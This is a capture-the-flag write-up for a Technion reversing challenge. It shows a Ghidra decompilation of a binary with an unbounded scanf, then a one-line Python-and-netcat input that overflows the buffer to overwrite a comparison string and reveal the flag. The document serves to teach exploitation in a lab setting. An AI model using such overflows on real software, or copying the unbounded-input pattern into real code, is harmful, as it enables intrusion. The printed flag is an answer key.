# Faculta Necshevet Identifier v2
Category: Reversing & Binary Exploitation

## Description
> After the failure of the previous version, DuckyDebugDuck created a new version which he says is "quack-proof", and even hid a new flag in it!

A binary file was attached.

## Solution

Let's run the attached file:

```console
root@kali:/media/sf_CTFs/technion/Faculta_Necshevet_Identifier_v2# ./facultaNecshevetIdentifier
My name is DuckyDebugDuck, what's yours? test
Hi test, checking...
You're not from a faculta necshevet, you won't get the flag
```

Just like in the [previous challenge](Faculta_Necshevet_Identifier.md), we must enter the correct name in order to be identified as worthy to get the flag.

Let's check the decompilation with Ghidra:

```c
undefined8 main(void)

{
  int is_equal;
  char user_input [59];
  char expected_name [5];
  
  expected_name._0_4_ = 0x45455754;
  expected_name[4] = 'T';
  printf("My name is DuckyDebugDuck, what\'s yours? ");
  __isoc99_scanf(&DAT_00102032,user_input);
  printf("Hi %s, checking...\n",user_input);
  is_equal = strcmp(expected_name,"QUACK");
  if (is_equal == 0) {
    puts("YOU\'RE FROM A FACULTA NECHSEVET, here\'s the flag: ###############");
  }
  else {
    puts("You\'re not from a faculta necshevet, you won\'t get the flag");
  }
  return 0;
}
```

Again, the program does not limit the user input, allowing us to override variables on the stack:

```assembly
                             DAT_00102032                                    XREF[1]:     main:001011d8(*)  
        00102032 25              ??         25h    %
        00102033 73              ??         73h    s
        00102034 00              ??         00h
```

We need to override `expected_name`, which starts with a value of `TWEET` and needs to be `QUACK` in order for us to read the flag. So, what we'll do is send 59 filler characters to fill up `user_input`, followed by a `QUACK` to override and re-populate `expected_name`:

```console
root@kali:/media/sf_CTFs/technion/Faculta_Necshevet_Identifier_v2# python -c "print('a'*59 + b'QUACK')" | nc ctf.cs.technion.ac.il 4006
My name is DuckyDebugDuck, what's yours? Hi aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaQUACK, checking...
YOU'RE FROM A FACULTA NECHSEVET, here's the flag: cstechnion{qu4ck_0v3rfl0w}
```